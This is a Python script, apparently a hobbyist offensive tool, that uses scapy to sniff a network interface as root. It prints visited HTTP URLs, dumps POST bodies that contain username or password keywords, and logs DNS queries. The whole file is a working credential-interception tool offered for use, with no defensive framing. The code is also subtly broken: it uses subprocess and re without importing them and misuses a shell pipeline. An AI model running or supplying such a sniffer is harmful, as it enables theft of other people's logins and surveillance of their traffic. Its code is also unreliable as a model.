#!/usr/bin/python3

try:
    print("[>] Importing modules")
    import scapy.all as scapy
    import scapy.layers.http as http
    import argparse
except ModuleNotFoundError:
    print("[!] Missing required modules, Exiting...")
    exit()
else:
    print("[>] Modules successfully imported")
    print() # Just a line break

########################################################################
# User Defined Functions
########################################################################

def do_nothing():

    """This function does nothing ;)"""
    
    pass

def get_arguments():

    """This function will get arguments from command line"""

    parser = argparse.ArgumentParser(description="All arguments are optional")
    parser.add_argument("-i","--interface",help="Interface to sniff on",dest="interface")
    parser.add_argument("-s","--silent",help="Show less output",action="store_true",dest='mute')
    options = parser.parse_args()
    return options.interface,options.mute

def is_root():
    
    """This function will check whether the script was run as root or not"""

    current_user_id = int(subprocess.check_output(["id","-u"]))
    if current_user_id == 0:
        return True
    else:
        return False

def get_default_interface():

    """This function will return default interface"""

    default_routing_table = str(subprocess.check_output(["route","|","grep","default"],shell=True))
    default_interface = re.search("[lawethn]{3,4}[\d]{1,2}",default_routing_table)
    
    return default_interface[0]

def sniff(interface):

    """This function will sniff packets on provided interface
       and call process_packet function to filter and display
       the result"""

    print("[>] Sniffing started, Capturing interesting packets\n")
    scapy.sniff(iface=interface,store=False,prn=process_packet)

def process_packet(packet):
    
    """This function will process the packets sniffed by sniff function
       It will filter specific packets and display specific info"""

    # Check if packet has HTTP layer
    if packet.haslayer(http.HTTPRequest):
        
        # Extract the URL and print
        url = extract_url(packet)
        print(f"\n[+] URL >> {url}\n")
        
        # Check further if it also has a Raw layer (which usually contains usernames and passwords sent in POST requests)
        if packet.haslayer(scapy.Raw):

            # Extract the Usernames and Password and print them
            username_password_combination = extract_username_password(packet)
            if username_password_combination:
                print(f"\n\n[+] Possible Username Password Combination >> {username_password_combination}\n\n")
    
    # Checking for DNS layer
    if packet.haslayer(scapy.DNSQR):

        # Extract the DNS request
        dns_request = extract_dns_requests(packet)
        if dns_request:
            print(f"[+] DNS Request >> {dns_request}")

def extract_url(packet):

    """This function will extract and return the URL from the HTTP layer
       It is called by process_packet when he (F for grammar) encounters a packet
       with HTTP layer"""

    hostname = packet[http.HTTPRequest].Host
    path = packet[http.HTTPRequest].Path
    url = str(hostname + path)
    return url[2:-1] # As the string is converted from byte-size string

def extract_username_password(packet):

    """This function will extract the usernames and passwords from
       the packet Raw layer if there are any and return them"""

    load_field_content = str(packet[scapy.Raw].load)
    load_field_content = load_field_content[2:-1]
    
    # Search for each keyword from the keywords list in Raw field and return if found any
    for keyword in keywords:
        if keyword in load_field_content:
            return load_field_content

def extract_dns_requests(packet):

    """This function will filter the DNS requests from the packet"""

    #Extracting the DNS request
    qname = str(packet[scapy.DNSQR].qname)
    qname = qname[2:-1]
    
    # Checking whether it is duplicate or not
    if not qname in dns_packets:
        dns_packets.append(qname)
        return qname
    else:
        return None

########################################################################
# The main function
########################################################################

# Some important variables
keywords = [
    "user","username","usr","name","usrname","uname",
    "password","pass","passwd","passwrd"
    ]
dns_packets = []

# Processing arguments
interface, mute = get_arguments()
if not interface:
    print("[-] Interface not provided, selecting default interface") if not mute else do_nothing()
    interface = get_default_interface()

# Checking for sufficient privileges
if is_root():
    do_nothing()
else:
    print("[!] Please run the script as root")
    exit()

# Pre-reporting
print(f"[>] Interface is set to {interface}") if not mute else do_nothing()
print(f"\n[+] Starting sniffing") if not mute else do_nothing()

# Starting the sniffing
sniff(interface) # It ain't much but it's honest work (Well, it isn't)

# Stopping the sniffing
print()
print("[+] Stopping sniffing") if not mute else do_nothing()
print("[+] Exiting...")